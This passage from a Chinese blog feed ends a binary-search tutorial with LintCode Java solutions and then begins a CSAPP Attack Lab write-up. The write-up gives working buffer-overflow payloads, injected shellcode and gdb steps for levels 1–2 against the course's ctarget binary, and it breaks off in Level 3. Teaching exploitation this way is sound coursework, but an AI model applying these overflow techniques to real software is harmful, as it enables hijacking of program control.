<p>总结起来就是:<br><code>nums[mid] &gt;= nums[0]</code> 落在左侧<br>    <code>nums[mid] &gt;= target &amp;&amp; target &gt;= nums[start]</code> ==&gt; <code>end = mid</code><br>    <code>else</code> ==&gt; <code>start = mid</code><br><code>nums[mid] &lt; nums[-1]</code>落在右侧<br>     <code>nums[mid] &lt;= target &amp;&amp; target &lt;= nums[end]</code> ==&gt; <code>start = mid</code><br>     <code>else</code> ==&gt; <code>end = mid</code><br>代码就是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(A == <span class="keyword">null</span> || A.length == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, end = A.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(start + <span class="number">1</span> &lt; end)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(A[mid] == target)&#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 落在左侧</span></span><br><span class="line">        <span class="keyword">if</span>(A[mid] &gt;= A[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[mid] &gt;= target &amp;&amp; target &gt;= A[start])&#123;</span><br><span class="line">                end = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                start = mid;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[mid] &lt;= target &amp;&amp; target &lt;= A[end])&#123;</span><br><span class="line">                start = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                end = mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(A[start] == target)&#123;</span><br><span class="line">        <span class="keyword">return</span> start;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(A[end] == target)&#123;</span><br><span class="line">        <span class="keyword">return</span> end;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="境界三-二分答案"><a href="#境界三-二分答案" class="headerlink" title="境界三: 二分答案"></a>境界三: 二分答案</h2><p>如果我们知道答案的分布区间，并能根据mid的条件不断缩小答案的范围，就可以做到二分答案。</p>
<h3 id="例题一-Maximum-Average-Subarray"><a href="#例题一-Maximum-Average-Subarray" class="headerlink" title="例题一:  Maximum Average Subarray"></a>例题一:  Maximum Average Subarray</h3><p><a href="http://lintcode.com/en/problem/maximum-average-subarray/" target="_blank" rel="noopener">Maximum Average Subarray</a><br>这道题要我们找数组的长度至少为k的最大平均子数组，那用二分法的思路去想呢。首先我们可以知道这个答案最大不会超过数组的最大值，最小不会小于数组的最小值。则我们可以以[最小值，最大值]为初试的搜索区间，计算出mid值之后判断是否有长度大于k的子数组可以满足平均值大于等于mid。如果有则查找[mid, end]如果没有则查找[start, mid]。 直到<code>end - start</code>满足我们的精度要求。 这样这道题目就变成了一个典型的二分法，而解法的难度实际上在于valid函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">maxAverage</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span> || k &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 首先找到数组中的最大值和最小值 则答案的区间为[start,end]</span></span><br><span class="line">        <span class="keyword">double</span> start = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">double</span> end = Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            start = Math.min(start, nums[i]);</span><br><span class="line">            end = Math.max(end, nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 对答案的区间[start, end]进行二分 </span></span><br><span class="line">        <span class="comment">// existAverage函数用来判断是否存在长度大于k 平均值等于mid的subarray</span></span><br><span class="line">        <span class="comment">//   如果存在则返回true 我们更新区间为[mid, end] 去搜索更大的答案</span></span><br><span class="line">        <span class="comment">//  如果不存在则返回false 遍历区间[start, mid] 搜索更小的答案</span></span><br><span class="line">        <span class="keyword">while</span> (end - start &gt;= <span class="number">1e-6</span>) &#123;</span><br><span class="line">            <span class="keyword">double</span> mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (existAverage(nums, k, mid)) &#123;</span><br><span class="line">                start = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                end = mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> start;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">existAverage</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k, <span class="keyword">double</span> mid)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span>[] sum = <span class="keyword">new</span> <span class="keyword">double</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">double</span> minSum = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             *  Normalize all the numbers by substracting mid,</span></span><br><span class="line"><span class="comment">             *  so the requirement become: check if there is a</span></span><br><span class="line"><span class="comment">             *  subarray of nums, whose count of elements &gt;= k</span></span><br><span class="line"><span class="comment">             *  and sum &gt;= 0.</span></span><br><span class="line"><span class="comment">             *  Generate its pre-sum array so that we can quickly</span></span><br><span class="line"><span class="comment">             *  calculate the sum of a certain range of nums.</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            sum[i + <span class="number">1</span>] = sum[i] + nums[i] - mid;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) &#123;</span><br><span class="line">                minSum = Math.min(minSum, sum[i - k + <span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (sum[i + <span class="number">1</span>] &gt;= minSum) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="例题二-Copy-Books"><a href="#例题二-Copy-Books" class="headerlink" title="例题二: Copy Books"></a>例题二: Copy Books</h3><p><a href="http://lintcode.com/en/problem/copy-books/" target="_blank" rel="noopener">Copy Bookes</a><br>这道题说有n个书，每本书有A[i]页，我们需要让k个人来抄写这n本书，一个人抄完第i本书之后可以继续抄第i+1本书，必须连续着抄。每分钟抄1页，求最好的分配策略使得能够最快被抄完。<br>这道题又是一道二分答案的题，首先最快就是min(nums)，最慢就是让一个人来抄所有的数也就是数组元素之和。这样就可以对[min(nums), sum(nums)]进行二分。 求出mid之后判断是否存在一个方案可以使在mid秒之内抄完所有的书，如果存在则<code>end = mid</code> 否则<code>start = mid</code>。 同样难点在实现valid函数上。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">copyBooks</span><span class="params">(<span class="keyword">int</span>[] pages, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pages.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max = - Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i: pages)&#123;</span><br><span class="line">            max = Math.max(max, i);</span><br><span class="line">            sum = sum + i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> start = max, end = sum;</span><br><span class="line">        <span class="keyword">while</span>(start + <span class="number">1</span> &lt; end)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(valid(pages, mid, k))&#123;</span><br><span class="line">                end = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                start = mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(valid(pages, start, k))&#123;</span><br><span class="line">            <span class="keyword">return</span> start;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(valid(pages, end, k))&#123;</span><br><span class="line">            <span class="keyword">return</span> end;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">valid</span><span class="params">(<span class="keyword">int</span>[] pages, <span class="keyword">int</span> mid, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;   <span class="comment">//当前这个人抄写的总量</span></span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>; <span class="comment">//需要的人数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pages.length; i ++)&#123;</span><br><span class="line">            sum += pages[i];</span><br><span class="line">            <span class="keyword">if</span>(sum &gt; mid)&#123;</span><br><span class="line">                sum = pages[i];</span><br><span class="line">                count = count + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count &lt;= k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Related-Problems-1"><a href="#Related-Problems-1" class="headerlink" title="Related Problems"></a>Related Problems</h3><p><a href="http://lintcode.com/en/problem/wood-cut/" target="_blank" rel="noopener">http://www.lintcode.com/en/problem/wood-cut/</a></p>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>LintCode上二分搜索的题目 <a href="http://www.lintcode.com/en/tag/binary-search/" target="_blank" rel="noopener">http://www.lintcode.com/en/tag/binary-search/</a></p>
<p>九章上二分法的题目和解题报告 <a href="http://www.jiuzhang.com/article/?tags=binary-search" target="_blank" rel="noopener">http://www.jiuzhang.com/article/?tags=binary-search</a></p>
<p>最后感谢一下九章算法的令狐老师，讲的灰常好！</p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LintCode </tag>
            
            <tag> NineChapter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP-Attack Lab]]></title>
      <url>/2018/02/22/CSAPP/Attack_Lab/</url>
      <content type="html"><![CDATA[<p>Attack Lab主要让我们实现两种类型的攻击： 缓冲区溢出攻击和ROP攻击（return-oriented programming）<br><a id="more"></a></p>
<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h2><p>每个函数都有自己的栈帧(stack frame)，可以把它理解为每个函数的工作空间，<strong>用来传递参数、存储返回信息、保存寄存器</strong>。 栈中保存着：</p>
<ul>
<li>本地变量</li>
<li>调用者和被调用者保存的寄存器里的值</li>
<li>其他一些函数调用可选的值<br>如下图所示</li>
</ul>
<p><img src="/images/CSAPP/attacklab-stack.jpg" alt="attacklab-stack"></p>
<h2 id="转移控制"><a href="#转移控制" class="headerlink" title="转移控制"></a>转移控制</h2><p>在函数调用的过程，调用者需要</p>
<ul>
<li>为要保存的寄存器及参数分配足够大的空间的栈帧</li>
<li>把所有caller-saved的寄存器存储在帧中</li>
<li>把所有被调用者需要的的参数按照逆序存入帧中</li>
<li><code>call fun</code> 会先把<code>%rip</code>（返回地址）入栈，保存到帧中，然后跳转到<code>fun</code>中</li>
</ul>
<p>被调用者需要</p>
<ul>
<li>把任何callee-saved的寄存器压栈</li>
</ul>
<p>在函数返回过程中 被调用者需要</p>
<ul>
<li>增加<code>%rsp</code>的计数，逆序弹出所有callee-saved的寄存器，执行<code>ret</code>弹出返回地址并跳转到这个位置</li>
</ul>
<p>所以根据上面的知识我们可以知道，利用缓冲区溢出实际上就是通过重写返回值地址来执行另一个代码片段。</p>
<h1 id="Code-Injection-Attacks"><a href="#Code-Injection-Attacks" class="headerlink" title="Code Injection Attacks"></a>Code Injection Attacks</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>第一个Level不需要注入新的代码，只需要让函数返回到其他位置即可。 <code>ctarget</code>正常流程会调用test函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们需要做的是在执行getbuf函数之后让程序跳转到的touch1函数，而不是返回到test函数当中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span>&#123;</span><br><span class="line">	vlevel = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Touch1!"</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以我们需要知道touch1函数的起始地址、然后将这个地址放置在正确的位置，覆盖掉原来的返回地址。另外需要注意字节序 (little endian)。 </p>
<p>首先通过<code>objdump -d ctarget &gt; ctarget.txt</code> 可以得到反汇编代码，在里面搜索getbuf得到下面一段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure></p>
<p>可以看到这里把 <code>%rsp</code> 移动了 <code>0x28</code>(40) 位, 所以我们的缓冲区有40byte，这40byte上面8byte存放的是返回地址 。如下图</p>
<p><img src="/images/CSAPP/attacklab.JPG" alt="attacklab"></p>
<p>我们要做的就是利用缓冲区溢出把这个返回地址改掉。 <code>disassemble touch1</code>得到touch1的地址为<code>0x004017c0</code>。所以我们应该输入的就是 （前40位随意） + c0174000 </p>
<p>创建文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure></p>
<p>先用hex2raw转换成字节码<code>./hex2raw &lt; level1.txt &gt; level1_raw.txt</code>， 然后执行<code>./ctarget -i level1_raw.txt</code>就可以看到结果了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00</span><br></pre></td></tr></table></figure>
<p>第一个level主要考察了如何利用缓冲区溢出来调用另外的过程。</p>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>level2要求我们注入少量代码。在ctarget中有一个touch2函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span>(val == cookies) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);	</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"MisFire!: You called touch2(0x%.8x)\n"</span>, val);	</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们的任务是让ctarget执行touch2函数，并且需要传入cookies作为参数。</p>
<p>首先跟level1相同的是需要找到touch2的起始位置，得到<code>0x004017ec</code>。 然后需要写出注入的代码 level2.s<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi  # 把参数存入%rdi寄存器中</span><br><span class="line">pushq $004017ec	       # 把touch2地址入栈</span><br><span class="line">ret	               # 这样ret就可以跳转到touch2</span><br></pre></td></tr></table></figure></p>
<p>然后转化成对应的机器码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c level2.s</span><br><span class="line">objdump -d level2.o &gt; level2.byte</span><br></pre></td></tr></table></figure></p>
<p>得到的level2.byte内容是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level2.o:     file format elf64-x86-64</span><br><span class="line">Disassembly of section .text:</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3</span><br></pre></td></tr></table></figure></p>
<p>所以我们应该输入的字符串就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa</span><br><span class="line">97 b9 59 68</span><br><span class="line">ec 17 40 00</span><br><span class="line">c3 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">** ** ** **</span><br></pre></td></tr></table></figure></p>
<p>最后4byte的位置怎么来确定呢？ 在getbuf的代码中，函数执行完毕时会执行ret指令，这个指令会取出我们将要填入的地址赋值给%rip，然后程序会从这个地方开始执行，那么我们现在就希望这个地址是我们字符串的起始位置（从这个位置开始执行我们注入的命令）。 这个起始位置也就是缓冲区的起始位置，需要我们跑一次程序查看一下。(输入一个短的string测试即可，这个时候执行过gets之后$rsp就指向缓冲区的起始位置)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble </span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:	sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:	callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">=&gt; 0x00000000004017b4 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) print $rsp</span><br><span class="line">$2 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure></p>
<p>所以最后4byte是<code>78 dc 61 55</code>。然后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; level2.txt &gt; level2_raw.txt</span><br><span class="line">./ctarget -q -i level2_raw.txt</span><br></pre></td></tr></table></figure></p>
<p>即可通过level2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55</span><br></pre></td></tr></table></figure></p>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>level3需要用到两个函数，hexmatch 和 touch3<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>]; <span class="comment">/*make position of checking string unpredictable*/</span></span><br><span class="line">	<span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> * sval)</span></span>&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>;</span><br><span class="line">	<span class="keyword">if</span>(hexmatch(cookies, sval))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Touch3 ! you called touch3(\"%s\")"</span>, sval);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"MisFire ! you called touch3(\"%s\")"</span>, sval);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
